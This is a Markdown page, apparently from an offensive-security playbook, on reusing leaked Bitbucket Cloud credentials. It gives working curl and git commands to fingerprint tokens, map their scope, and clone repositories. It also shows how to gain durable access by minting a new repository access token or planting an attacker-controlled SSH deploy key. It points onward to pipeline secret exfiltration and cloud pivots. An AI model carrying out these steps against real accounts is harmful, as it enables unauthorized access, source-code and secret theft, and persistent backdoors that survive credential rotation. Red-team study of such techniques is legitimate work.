---
title: "Token and app-password abuse: reusing leaked Bitbucket Cloud credentials"
description: "Identifying and reusing leaked Bitbucket Cloud credentials: scoped API tokens, repository/project/workspace access tokens, and OAuth consumers, reading their identity and scope through the 2.0 API, cloning and pushing over git, and minting durable access. Covers why retired app passwords no longer authenticate."
keywords:
  - Bitbucket API token
  - access token
  - credential reuse
  - OAuth consumer
  - app password
---

# Token and app-password abuse

Bitbucket Cloud hands out several kinds of credential, and a leaked live one is often the whole engagement. They differ in how you authenticate and in what identity and scope they carry, so the first job with any captured string is to classify it, read its identity and permissions, then act inside them. Everything runs against `https://api.bitbucket.org/2.0` and `git` over HTTPS.

One classification matters before anything else: **app passwords are retired**. Atlassian disabled app passwords for Bitbucket Cloud in 2026 and moved authentication to scoped API tokens, so an `ATBB...` string recovered from an old leak no longer authenticates and is dead loot. The live credentials are Atlassian API tokens, Bitbucket access tokens, and OAuth tokens.

## Credential shapes and fingerprint

Classify by which auth scheme the API accepts.

| Credential | Auth scheme | Identity | Status |
| --- | --- | --- | --- |
| Atlassian API token | Basic `email:api_token` | the Atlassian account | live |
| Repository / project / workspace access token | Bearer | the resource, no user | live |
| OAuth 2.0 access token | Bearer | the authorizing user | live |
| App password | Basic `username:app_password` | the user who created it | retired, no longer authenticates |

```bash
# Atlassian API token: Basic auth with the account email, identity via /2.0/user
curl -s -u "$BB_EMAIL:$BB_API_TOKEN" https://api.bitbucket.org/2.0/user | jq '{username,account_id,nickname}'

# Access token or OAuth token: Bearer auth
curl -s -H "Authorization: Bearer $BB_SECRET" https://api.bitbucket.org/2.0/user
```

Interpret the responses. A `200` from the Basic-auth `/2.0/user` call with an email as the username is a live Atlassian API token. A Bearer token that `401`s on `/2.0/user` but succeeds on a repository endpoint is a **repository access token**: it has no user identity and is bound to exactly one repository, so that binding tells you the blast radius without further guessing. A Basic `username:secret` that `401`s is most likely a retired app password, not a live credential.

## Reading the scope you hold

A token carries only the scopes its creator granted (account, repository read/write/admin, pipelines, webhooks, and so on). You cannot list the scopes directly, so you probe: each endpoint either returns data or `403`s, and the pattern maps the grant.

```bash
AUTH=(-u "$BB_EMAIL:$BB_API_TOKEN")     # or: AUTH=(-H "Authorization: Bearer $BB_TOKEN")

# repository read
curl -s -o /dev/null -w '%{http_code} repos-read\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME?pagelen=1
# pipelines (can it trigger builds)
curl -s -o /dev/null -w '%{http_code} pipelines\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config
# admin (can it add tokens, keys, webhooks for persistence)
curl -s -o /dev/null -w '%{http_code} admin\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/deploy-keys
```

A `200` on `deploy-keys` means repository admin, the strongest position: you can plant an SSH deploy key or a new access token for durable access. A `200` on `pipelines_config` plus repository write is the handoff to [Pipelines abuse](pipelines-abuse.md).

## Acting within the grant

Enumerate, then act. With repository read, clone everything the credential reaches and mine it as in [Reconnaissance](reconnaissance.md).

```bash
# Clone with an Atlassian API token (Basic, account email as the username)
git clone https://$BB_EMAIL:$BB_API_TOKEN@bitbucket.org/ACME/payments-api.git

# Clone with an access token: the username is the literal x-token-auth
git clone https://x-token-auth:$BB_TOKEN@bitbucket.org/ACME/payments-api.git
```

With repository write you can push a branch, which is enough to trigger a pipeline and reach its secrets. With admin, mint persistence that outlives the leaked credential:

```bash
# Create a repository access token scoped to full repo + pipelines control (requires admin)
curl -s "${AUTH[@]}" -X PUT \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/access-tokens \
  -H 'Content-Type: application/json' \
  -d '{"name":"ci-maintenance","scopes":["repository:write","pipeline:write"]}' \
  | jq -r '.token'

# Or add an SSH deploy key you hold the private half of
curl -s "${AUTH[@]}" -X POST \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/deploy-keys \
  -H 'Content-Type: application/json' \
  -d '{"label":"backup","key":"ssh-ed25519 AAAA... attacker"}'
```

The returned access token is a fresh `ATCTT...` credential bound to the repository, a separate principal that keeps working even after the credential you came in on is rotated.

## Variants and follow-on

- **Atlassian API token reach**: an Atlassian API token authenticates the account against Bitbucket and other Atlassian Cloud products on the same account (Jira, Confluence), so a single token widens the pivot beyond the forge. It reaches every workspace and repository the account can, not just one repo.
- **Access token is resource-scoped**: a repository/project/workspace access token is narrow by design, bound to one resource with no user identity, so it is a smaller blast radius but also quieter.
- **OAuth consumer secrets**: a leaked OAuth consumer key and secret let you mint tokens on demand through the client-credentials or authorization-code flow, which is persistence at the application level rather than a single token.
- **Follow-on**: a write-capable credential routes to [Pipelines abuse](pipelines-abuse.md) for secret exfiltration and cloud pivots; any cloud key found through that path routes to [AWS](../../cloud/aws/index.md).

## Notes

- App passwords are retired: a Basic `username:app_password` credential from an old leak no longer authenticates, so do not waste an engagement replaying `ATBB...` strings. Atlassian API tokens (Basic with the account email) are the Basic-auth replacement.
- Access tokens never have a user identity; stop trying `/2.0/user` with them and probe resource endpoints to find the one repository, project, or workspace they bind to.
- Scope probing with `-o /dev/null -w '%{http_code}'` is read-only and fast; map the grant before taking any write action so you do not trip on a `403` mid-operation.
- On Bitbucket Data Center/Server the equivalent is an HTTP access token presented as `Authorization: Bearer` against `/rest/api/1.0/`; the Cloud 2.0 scopes model does not exist there.

## Tools

- **curl** / **jq**: classify credentials, probe scope, and drive the 2.0 API.
- **git**: clone and push with the credential embedded in the URL.
- **TruffleHog** / **Gitleaks**: recover these credentials in the first place from code and history.

## References

- [Bitbucket Cloud: repository, project, and workspace access tokens](https://support.atlassian.com/bitbucket-cloud/docs/using-access-tokens/)
- [Bitbucket Cloud: create an API token](https://support.atlassian.com/bitbucket-cloud/docs/create-an-api-token/)
- [Atlassian: manage API tokens for your account](https://support.atlassian.com/atlassian-account/docs/manage-api-tokens-for-your-atlassian-account/)
- [Bitbucket Cloud REST API: authentication](https://developer.atlassian.com/cloud/bitbucket/rest/intro/#authentication)
- [Bitbucket Cloud REST API: repository access tokens](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-repository-access-tokens/)
